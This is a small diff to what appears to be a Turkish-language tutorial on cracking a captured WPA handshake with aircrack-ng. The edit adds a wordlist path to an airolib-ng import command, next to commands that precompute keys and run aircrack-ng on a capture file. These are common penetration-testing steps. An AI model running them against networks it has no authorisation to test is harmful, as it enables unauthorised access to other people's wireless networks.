@@ -43,7 +43,7 @@ işleyin ve daha önce yakaladığınız WPA el sıkışmasını kırmak için A
 
 # echo mywifu > essid.txt 
 # airolib-ng mywifu --import essid essid.txt 
-# airolib-ng mywifu --import passwd
+# airolib-ng mywifu --import passwd /pentest/passwords/john/password.lst
 # airolib-ng mywifu --batch
 # aircrack-ng -r mywifu wap.cap 
 
